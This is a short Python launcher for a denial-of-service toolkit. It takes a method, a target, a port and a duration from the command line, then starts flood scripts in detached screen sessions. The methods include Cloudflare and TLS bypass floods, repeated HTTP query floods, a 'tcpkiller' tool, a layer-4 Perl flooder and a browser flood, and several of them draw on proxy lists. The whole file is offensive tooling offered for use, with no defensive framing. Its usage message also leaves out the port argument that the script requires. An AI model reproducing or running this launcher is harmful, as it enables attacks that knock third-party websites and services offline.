import os
import sys
import time
from colorama import Fore

method = sys.argv[1].upper()
target = sys.argv[2]
port = sys.argv[3]
time = sys.argv[4]

if method == "TLS-CF":
    os.system(f"screen -dm node TLS-CF.js {target} {time} 64 10 http-checked.txt")
elif method == "CF-TLS":
    os.system(f"screen -dm node CF-TLS.js {target} {time} 10 http-checked.txt")
elif method == "CF-L4":
    os.system(f"screen -dm perl cloudflare.pl {target} {port} {time}") 
elif method == "TLS-MIX":
    os.system(f"screen -dm node tls-mix.js {target} {time} 64 10 http-checked.txt")
elif method == "QUERY":
    os.system(f"screen -dm node http-query.js {target} {time} 500")
    os.system(f"screen -dm node http-query.js {target} {time} 500")
    os.system(f"screen -dm node http-query.js {target} {time} 500")
    os.system(f"screen -dm node http-query.js {target} {time} 500")
    os.system(f"screen -dm node tcpkiller {target} 2.txt {time}")
    os.system(f"screen -dm node tcpkiller {target} 2.txt {time}")
    os.system(f"screen -dm node tcpkiller {target} 2.txt {time}")
elif method == "HTTPSOCKET":
    os.system(f"screen -dm ./query {target} {time} 450 2")
    os.system(f"screen -dm node tls {target} {time} 1 2.txt")
elif method == "BROWSER":
    os.system(f"screen -dm node play {target} {time} 5 http.txt")
else:
    print(f"""
{Fore.RED}[ERROR]: Invalid syntax{Fore.RESET}
{Fore.YELLOW}[SYNTAX]: python3 send.py [method] {target} [time]{Fore.RESET}
{Fore.GREEN}[EXAMPLE]: python3 send.py get https://example.com/ 120{Fore.RESET}
""")
    exit()
